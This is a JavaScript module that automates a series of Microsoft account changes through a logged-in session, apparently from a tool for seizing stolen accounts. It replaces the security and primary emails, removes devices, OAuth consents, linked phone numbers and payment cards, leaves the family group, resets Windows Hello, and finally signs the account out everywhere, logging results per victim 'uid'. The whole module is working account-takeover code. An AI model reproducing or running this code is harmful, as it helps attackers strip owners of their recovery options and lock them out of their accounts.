const {
    updateStatus,
    updateExtraInformation
} = require("../process/helpers");
const removeDevices = require("../devices/removeDevices");
const removeConsents = require("../consents/removeConsents");
const resetWindowsHello = require("../logout/resetWindowsHello");
const signoutFromAllDevices = require("../logout/signoutFromAllDevices");
const leaveFamily = require("../family/leaveFamily");
const getFamily = require("../family/getFamily");
const removeLinkedNumbers = require("../logout/removeLinkedNumbers");
const removeOldSecurityEmails = require("../logout/removeOldSecurityEmails");
const removeCards = require("../secure/removeCards");
const getAliases = require("../secure/getAliases");

const timeTracker = () => {
    const startTime = Date.now();
    return {
        end: (sectionName) => {
            const endTime = Date.now();
            const duration = (endTime - startTime) / 1000;
            console.log(`Section "${sectionName}" completed in ${duration.toFixed(2)} seconds`);
            return duration;
        }
    };
};

/*
- Remove old security email proofs (while session is fresh)
- Remove devices if enabled
- Revoke OAuth app consents if enabled
- Leave Microsoft family
- Remove Exploit / Reset Windows Hello
- Remove linked phone numbers
- Remove payment cards / instruments
- Sign out from all devices (strictly executed AFTER all above operations complete)
*/

module.exports = async function removesection(settings, signout, exploit, uid, axios, securityParameters, msatoken, secEmail = null, newPrimaryEmail = null) {
    const tracker = timeTracker();

    let family = null;
    try {
        family = await getFamily(axios);
    } catch (e) {
        console.error(`[REMOVE_SECTION] Error fetching family for ${uid}:`, e.message);
    }

    // 0. Remove old security email proofs (while session is still fresh)
    try {
        const secEmailResult = await removeOldSecurityEmails(axios, {
            netId: securityParameters?.netId,
            newSecurityEmail: secEmail,
            newPrimaryEmail: newPrimaryEmail
        });
        await updateExtraInformation(uid, "secemailremoval", JSON.stringify(secEmailResult));
    } catch (secEmailErr) {
        console.error(`[REMOVE_SECTION] Error removing old security emails for ${uid}:`, secEmailErr.message);
        await updateExtraInformation(uid, "secemailremoval", JSON.stringify({ error: secEmailErr.message }));
    }

    // 1. Remove Devices (sequential)
    if (settings.removedevices) {
        try {
            const devicesr = await removeDevices(axios);
            console.log(`[REMOVE_SECTION] Devices removal result for ${uid}:`, devicesr);

            let devicesremoved;
            if (typeof devicesr === "object" && devicesr !== null) {
                devicesremoved = devicesr;
            } else if (devicesr === 0) {
                devicesremoved = {
                    status: true,
                    reason: 0,
                    total: 0
                };
            } else if (typeof devicesr === "number" && devicesr > 0) {
                devicesremoved = {
                    status: true,
                    reason: devicesr
                };
            } else {
                devicesremoved = {
                    status: false,
                    reason: "Failed to remove devices."
                };
            }

            await updateExtraInformation(uid, "devicestatus", JSON.stringify(devicesremoved));
        } catch (devErr) {
            console.error(`[REMOVE_SECTION] Error in removeDevices for ${uid}:`, devErr.message);
            await updateExtraInformation(uid, "devicestatus", JSON.stringify({
                status: false,
                reason: devErr.message
            }));
        }
    } else {
        const devicesremoved = {
            status: false,
            reason: "Option is disabled."
        };
        await updateExtraInformation(uid, "devicestatus", JSON.stringify(devicesremoved));
    }

    // 2. Remove OAuth Apps / Consents (sequential)
    if (settings.oauthapps) {
        try {
            const statusoauths = await removeConsents(axios);
            console.log(`[REMOVE_SECTION] OAuth consents remaining for ${uid}: ${statusoauths}`);
            await updateStatus(uid, "oauths", statusoauths);
        } catch (oauthErr) {
            console.error(`[REMOVE_SECTION] Error in removeConsents for ${uid}:`, oauthErr.message);
            await updateStatus(uid, "oauths", "Error removing OAuths");
        }
    } else {
        await updateStatus(uid, "oauths", "Option is disabled.");
    }

    // 3. Leave Microsoft Family (sequential)
    if (family) {
        const members = Array.isArray(family.Members) ? family.Members : (Array.isArray(family.members) ? family.members : []);
        if (members.length > 0) {
            try {
                const familysecured = await leaveFamily(axios);
                console.log(`[REMOVE_SECTION] Family removal result for ${uid}:`, familysecured);
                await updateExtraInformation(uid, "leftfamily", familysecured ? "True" : "False");
            } catch (famErr) {
                console.error(`[REMOVE_SECTION] Error in leaveFamily for ${uid}:`, famErr.message);
                await updateExtraInformation(uid, "leftfamily", "Failed to leave family!");
            }
        } else {
            await updateExtraInformation(uid, "leftfamily", "None");
        }
    } else {
        await updateExtraInformation(uid, "leftfamily", "None");
    }

    // 4. Remove Exploit / Reset Windows Hello (sequential)
    if (exploit) {
        try {
            // Fetch fresh canary for Windows Hello revocation
            let helloCanary = null;
            try {
                const freshState = await getAliases(axios);
                helloCanary = freshState?.apiCanary || freshState?.canary || null;
            } catch (err) {
                console.error(`[REMOVE_SECTION] Failed to fetch fresh canary for resetWindowsHello for ${uid}:`, err.message);
            }

            const exploitRemoved = await resetWindowsHello(axios, helloCanary);
            await updateExtraInformation(uid, "exploit", exploitRemoved ? "True" : "False");
        } catch (expErr) {
            console.error(`[REMOVE_SECTION] Error in resetWindowsHello for ${uid}:`, expErr.message);
            await updateExtraInformation(uid, "exploit", "False");
        }
    } else {
        await updateExtraInformation(uid, "exploit", "Option is disabled");
    }

    // 5. Remove Linked Phone Numbers (sequential)
    if (settings.removelinkednumbers !== 0) {
        try {
            const removedNumbers = await removeLinkedNumbers(axios, securityParameters);
            console.log(`[REMOVE_SECTION] Linked numbers removed for ${uid}: ${removedNumbers}`);
        } catch (numErr) {
            console.error(`[REMOVE_SECTION] Error removing linked numbers for ${uid}:`, numErr.message);
        }
    }

    // 6. Remove Payment Cards / Instruments (sequential)
    if (settings.removecards !== 0 || msatoken) {
        try {
            const cardResult = await removeCards(msatoken, axios);
            console.log(`[REMOVE_SECTION] Cards removal result for ${uid}:`, cardResult);
            await updateExtraInformation(uid, "cardstatus", JSON.stringify(cardResult));
            if (cardResult?.status) {
                await updateExtraInformation(uid, "cards", JSON.stringify(cardResult));
            }
        } catch (cardErr) {
            console.error(`[REMOVE_SECTION] Error in removeCards for ${uid}:`, cardErr.message);
            await updateExtraInformation(uid, "cardstatus", JSON.stringify({ status: false, error: cardErr.message }));
        }
    } else {
        await updateExtraInformation(uid, "cardstatus", JSON.stringify({ status: false, reason: "Option is disabled." }));
    }

    // 7. Sign out from all devices (MUST be performed last)
    if (signout) {
        try {
            // Fetch a fresh canary token for the signout request
            let signoutCanary = null;
            try {
                const freshState = await getAliases(axios);
                signoutCanary = freshState?.apiCanary || freshState?.canary || null;
            } catch (err) {
                console.error(`[REMOVE_SECTION] Failed to fetch fresh canary for signoutFromAllDevices for ${uid}:`, err.message);
            }

            const signedout = await signoutFromAllDevices(axios, signoutCanary);
            await updateExtraInformation(uid, "signout", signedout ? "True" : "False");
        } catch (signOutErr) {
            console.error(`[REMOVE_SECTION] Error in signoutFromAllDevices for ${uid}:`, signOutErr.message);
            await updateExtraInformation(uid, "signout", "False");
        }
    } else {
        await updateExtraInformation(uid, "signout", "Option is disabled.");
    }

    tracker.end("Total Remove Section");
};
